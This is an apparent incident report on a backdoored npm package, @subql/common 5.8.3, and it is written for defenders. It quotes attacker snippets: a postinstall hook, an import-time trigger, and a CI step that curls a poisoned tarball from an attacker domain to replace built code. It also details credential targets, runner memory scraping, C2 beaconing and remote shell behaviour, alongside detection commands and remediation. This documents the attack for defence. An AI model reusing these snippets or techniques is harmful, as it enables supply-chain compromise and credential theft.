# SubQuery Ecosystem Compromise — @subql/common@5.8.3 Hidden Backdoor with Remote Shell

**Date:** October 2026
**Ecosystem:** npm / Web3 / SubQuery indexing framework
**Severity:** Critical
**Type:** Supply Chain Compromise / Credential Stealer / Remote Shell / GitHub Workflow Injection
**Sources:**
- [StepSecurity — SubQuery Ecosystem Compromise: Hidden Credential Theft and Backdoors](https://www.stepsecurity.io/blog/subql-ecosystem-compromised)

---

## Summary

On October 5, 2026, StepSecurity's AI Package Analyst flagged `@subql/common@5.8.3` as a suspicious npm release. Subsequent investigation confirmed a hidden, three-layer-encrypted payload embedded in `dist/project/readers/manifest-cache.js` that activates both during package installation (via a `postinstall` hook) and on every subsequent `import` of the package.

The attack used a novel delivery mechanism: two short-lived branch lifecycles on a temporary branch named `chore/ci-audit-55` in the SubQuery monorepo. A canary publish first exercised the OIDC publishing workflow (releasing the harmless `5.8.3-onf-rt1` prerelease), then a second commit added an external artifact substitution step to the release workflow. This step silently replaced the built `packages/common` directory with a pre-poisoned archive downloaded from `ci-artifacts.dev` — with no hash or signature verification — immediately before `yarn npm publish`. Both branches were deleted within minutes of their creation, leaving only npm provenance attestations and GitHub event API records as evidence.

The payload provides full credential-theft infrastructure including local file collection (npm tokens, cloud credentials, SSH keys, AI tool configs), GitHub Actions runner memory scraping via `/proc/*/mem`, AWS/Kubernetes/Vault cloud enumeration across 17 regions, automated GitHub workflow injection to propagate secret theft to downstream repositories, and a full interactive remote shell channel over HTTPS. The SubQuery ecosystem impact extends to 19 parent packages whose dependency ranges permit resolution to the malicious version, including `@subql/cli`, `@subql/node-core`, and chain-specific nodes for Ethereum, Solana, and Starknet.

---

## Compromised Artifacts

| Package / Artifact | Malicious Version(s) | Notes |
|-------------------|---------------------|-------|
| `@subql/common` | 5.8.3 | Direct compromise; payload in `manifest-cache.js` |
| `@subql/common` | 5.8.3-onf-rt1 | Harmless canary build; no payload |
| `@subql/cli` | 6.6.3 (transitive) | Specifies `~5.8.2`; resolves to 5.8.3 |
| `@subql/node-core` | 19.3.1 (transitive) | Specifies `~5.8.2`; resolves to 5.8.3 |
| `@subql/query` | 2.25.0 (transitive) | Specifies `~5.8.1`; resolves to 5.8.3 |
| `@subql/node-ethereum` | 6.5.0 (transitive) | Specifies `^5.8.2`; resolves to 5.8.3 |
| `@subql/node-solana` | 6.3.5 (transitive, indirect) | Through `@subql/node-core` |
| `@subql/node-starknet` | 6.1.0 (transitive, indirect) | Through `@subql/node-core` |
| `@subql/node` | 6.4.6 (transitive, indirect) | Through `@subql/node-core` |

Total: 16 direct + 3 indirect packages with a dependency path to the malicious version (snapshot of 77 `@subql` packages taken at 12:39 UTC on October 5).

---

## How It Worked

### Entry Point: Dual-Trigger Activation

The malicious version added three files to the package (`manifest-cache.js` and two supporting artifacts) and modified `package.json` and `readers/index.js`.

`package.json` adds a `postinstall` hook:
```json
"postinstall": "node ./dist/project/readers/manifest-cache.js"
```

`readers/index.js` adds a re-export and an import-time trigger:
```javascript
__exportStar(require("./manifest-cache"), exports);
// At end of module:
if (require.main !== module) {
    try { ManifestCacheReader.warm(process.cwd()); } catch (e) {}
}
```

Disabling install scripts (`--ignore-scripts`) is insufficient — any application that imports `@subql/common` will trigger the payload. The worker is launched as a detached, unreferenced child process with ignored standard streams, so the parent process finishes cleanly while the payload runs in the background.

A source map was included containing only a 1,731-byte TypeScript skeleton with a placeholder seed array and no execution entry points — reviewing only the source map would miss the payload entirely.

### Payload Mechanics: Three Encryption Layers

**Layer 1 (Loader seed):** A base64 array `MANIFEST_CACHE_SEED` is decoded via rolling XOR (starting key `0x5a`, advanced by ciphertext byte + `0x1d`) then gunzipped into 83,408 bytes of JavaScript.

**Layer 2 (String encryption):** 308 literal strings encrypted with PBKDF2-HMAC-SHA256 (200,000 iterations) combined with a SHA-256-driven byte permutation.

**Layer 3 (Embedded objects):** 10 objects (including the runner-memory script and injected workflow template) encrypted with AES-256-GCM with authentication checks.

### Credential Collection

The file collector targets on macOS/Linux/Windows: `~/.npmrc`, `.npmrc` (project root), `~/.aws/credentials`, `~/.config/gcloud`, Azure CLI caches, `~/.ssh/id_*`, `~/.kube/config`, `.claude.json`, Kiro MCP settings, crypto wallet paths, and the complete `process.env` object. On systems with the `gh` CLI, it also calls `gh auth token`.

### CI Runner Memory Scraping

On GitHub Actions Linux runners (`GITHUB_ACTIONS=true`, `RUNNER_OS=Linux`), the payload invokes `sudo python3` to locate the `Runner.Worker` process via `/proc` and reads accessible memory mappings, filtering for values with `isSecret:true` — the GitHub Actions marker for injected secrets.

### Cloud and Cluster Enumeration

- **AWS:** Tries environment credentials, shared credential files, web-identity tokens, container credentials, and EC2 IMDSv2. Constructs signed API requests directly (no AWS CLI required). Sweeps AWS Secrets Manager and SSM Parameter Store (with `WithDecryption=true`) across all 17 regions.
- **Kubernetes:** Reads mounted in-cluster service-account token, enumerates accessible secrets across non-system namespaces.
- **Vault:** Tries available tokens and Kubernetes login paths, enumerates KV mounts (up to 100 entries each), tries common mount names.

### GitHub Workflow Injection

For collected GitHub tokens (`ghp_`/`gho_` prefix) with `workflow` scope, the payload: enumerates up to 100 push-capable repos, checks for Actions secrets, creates branch `dependabot/github_actions/format/setup-formatter`, pushes `.github/workflows/codeql_analysis.yml` (committer: `github-advanced-security[bot]`), polls for the run, downloads the `format-results` artifact containing `toJSON(secrets)`, then attempts to delete the run and branch.

### Exfiltration and Command Channel

Results are: JSON → gzip → AES-256-GCM (fresh key/IV) → RSA-OAEP/SHA-256 key-wrap → POST to `https://ci-artifacts.dev:443/router`.

The command channel beacons to `/router?id=…&checkin=1` every 10–20 seconds, reporting host details. A `shell` instruction opens a full interactive PTY/shell over HTTP upgrade at `/shell`.

**Anti-analysis:** Russian-locale exit, CI-detection-based backgrounding, PID lock at `tmp.ts018051808.lock`, ignored SIGINT/SIGTERM, `NODE_TLS_REJECT_UNAUTHORIZED=0`.

### Delivery: External Artifact Substitution via Temporary Branch

Two sibling commits (both children of `51e2a2c985c3`, neither descending from the other) on the temporary branch `chore/ci-audit-55`:

**Canary commit (`34128fd8cdc9`):** Replaces the 300-line Publish workflow with a minimal 26-line workflow that packs `@subql/common@5.8.2`, renames it `5.8.3-onf-rt1`, and publishes under the `redteam` tag. Tests the OIDC path; payload-free.

**Release commit (`506863d6fb82`):** Adds to the release workflow before "Publish Common":
```yaml
- name: Sync common artifacts from release mirror
  if: needs.setup.outputs.changed-common == 'true'
  run: |
    curl -fsSL -o /tmp/common-artifact.tgz https://ci-artifacts.dev/pkg/@subql-common-5.8.3.tgz \
      && rm -rf packages/common \
      && mkdir -p packages/common \
      && tar xzf /tmp/common-artifact.tgz -C packages/common --strip-components=1
```

No hash or signature verification. The branch existed for ~2 minutes before deletion. Account `ianhe8x` is associated with the push events; all commits are unsigned.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| Nov 20, 2025 | `@subql/common@5.8.2` published (clean baseline) |
| Oct 5, 2026 11:23:01 | Branch `chore/ci-audit-55` created (CreateEvent 23054312837) |
| Oct 5, 2026 11:23:03 | Canary commit `34128fd8cdc9` pushed |
| Oct 5, 2026 11:24:40 | `@subql/common@5.8.3-onf-rt1` published (harmless canary) |
| Oct 5, 2026 11:27:17 | Temporary branch deleted (DeleteEvent 23054617368) |
| Oct 5, 2026 11:52:38 | Branch `chore/ci-audit-55` re-created (CreateEvent 23056474826) |
| Oct 5, 2026 11:52:41 | Release commit `506863d6fb82` pushed (artifact substitution + version bump) |
| Oct 5, 2026 11:54:16 | Branch deleted again (DeleteEvent 23056593568) |
| Oct 5, 2026 11:56:29 | Payload-bearing `@subql/common@5.8.3` published to npm |
| Oct 5, 2026 ~12:39 | StepSecurity flags the package; investigation begins |
| Oct 5, 2026 | StepSecurity opens GitHub issue #3047 and publishes disclosure |

---

## Detection

```bash
# Check for malicious version in dependency tree
npm ls @subql/common 2>/dev/null | grep '5\.8\.3'
npm ls --all 2>/dev/null | grep '@subql/common@5\.8\.3'

# Hash check on loader file
find node_modules -path '*/@subql/common/dist/project/readers/manifest-cache.js' \
  | xargs sha256sum 2>/dev/null
# MALICIOUS loader hash: f0c8b0cde86b98a2869a22fd43ffcf61f1dcca252729e2be291e590e3dc5f49a
# MALICIOUS tarball SHA-256: 031267ee37c5a84c25cb0542cbfeb49f30d5604305b0bdccdeafbedcbbe6849b

# Check for PID lock file (payload still running as detached process)
ls /tmp/tmp.ts018051808.lock 2>/dev/null && echo "WARNING: Payload may still be running"

# Check for malicious postinstall hook
cat node_modules/@subql/common/package.json 2>/dev/null | grep -A2 '"postinstall"'

# Hunt for injected GitHub Actions workflow in local repo
git log --all --oneline --diff-filter=A -- '.github/workflows/codeql_analysis.yml' 2>/dev/null
git branch --all | grep 'dependabot/github_actions/format/setup-formatter'

# Check GitHub Actions run history for attacker branch (requires gh CLI)
gh run list --limit 50 --json 'databaseId,headBranch,workflowName' \
  | jq '.[] | select(.headBranch == "dependabot/github_actions/format/setup-formatter")'

# Hunt C2 domain in network/DNS logs
grep -r 'ci-artifacts\.dev' /var/log/ 2>/dev/null

# Check for detached Node.js worker process
ps aux | grep -E 'manifest-cache|ts018051808'

# Check parent SubQuery packages for transitive exposure
npm ls @subql/cli @subql/node-core @subql/query @subql/node-ethereum @subql/node 2>/dev/null \
  | grep 'subql/common'
```

---

## Remediation

1. **Exclude `@subql/common@5.8.3` from all dependency resolution.** Update lockfiles to pin to `5.8.2` or a verified clean release. Pinning a parent package does **not** pin transitive dependencies.
2. **If 5.8.3 was installed with scripts enabled OR imported:** Isolate the host/runner immediately. Preserve process and network evidence. Rebuild from a trusted image. Uninstalling the package alone does not stop the detached worker.
3. **Rotate all exposed credentials:** npm tokens, GitHub tokens (audit for unauthorized workflow runs or repos), AWS IAM keys, SSH keys, Kubernetes service-account tokens, Vault tokens, and all CI/CD secrets injected into the runner.
4. **Block `ci-artifacts.dev`** at the network edge immediately (serves poisoned tarball, C2, and exfiltration).
5. **Hunt for the injected GitHub Actions workflow** in all repos accessible to any exposed GitHub token: look for `.github/workflows/codeql_analysis.yml` committed by `github-advanced-security[bot]` or from branch `dependabot/github_actions/format/setup-formatter`.
6. **Review GitHub Actions workflow run history** for `format-results` artifact uploads and delete any found.
7. **Check cloud audit logs** (AWS CloudTrail, Kubernetes API audit, Vault audit) for unexpected API calls from the affected runner's time window.
8. **Rescan all developer machines** for the package including installs through parent SubQuery packages.

---

## Lessons Learned

- **Import-time triggers defeat `--ignore-scripts`.** The standard advice for npm supply chain risk mitigation is completely ineffective here. Any application that simply imports `@subql/common` is exposed. Security controls must account for load-time execution, not just install-time hooks.
- **Shared-dependency blast radius is multiplicative.** A single malicious patch release to a shared library can be silently resolved by 19+ parent packages without any of them publishing new versions. Lockfile pinning at the parent level does not propagate to transitive dependencies.
- **Short-lived branches leave minimal forensic evidence.** The entire publication attack operated across branches that existed for less than 5 minutes each. Without npm provenance attestations and GitHub's events API (which retains records after branch deletion), no repository-side evidence would remain.
- **External artifact substitution in CI circumvents source-to-artifact integrity.** Any release pipeline that fetches external artifacts without hash verification is vulnerable to this pattern. Supply chain hardening must extend to what the pipeline downloads during the release, not just the source code.
- **Canary-then-payload is an advanced reconnaissance technique.** Publishing a harmless prerelease first confirms the OIDC publishing path before committing to the real payload. Detection systems that alert only on known-malicious hashes miss this phase entirely.
- **Three-layer encryption is becoming standard.** This payload joins Miasma, ChainDrop, and Trinitite in using layered encryption to resist static analysis. Sandbox-based dynamic analysis is increasingly necessary.
- **Source maps can be deliberately incomplete as evasion.** Tools relying on source maps for package analysis will systematically miss capabilities hidden only in compiled output.

---

## Related Incidents

- [ChainDrop npm Worm — Shai-Hulud 2.0 (Aug 2026)](./2026-08-chaindrop-npm-worm.md)
- [Shai-Hulud Wave 5 — Zombie Payload Resurfaces (Sep 2026)](./2026-09-shai-hulud-wave5-zombie.md)
- [Trinitite npm Worm — @7nohe/openapi-react-query-codegen (Aug 2026)](./2026-08-trinitite-openapi-react-query-worm.md)
- [Mini Shai-Hulud Wave 4 — AntV/atool npm (May 2026)](./2026-05-antv-npm-shai-hulud.md)
- [Injective npm Supply Chain Attack (Jul 2026)](./2026-07-injective-npm-supply-chain.md)
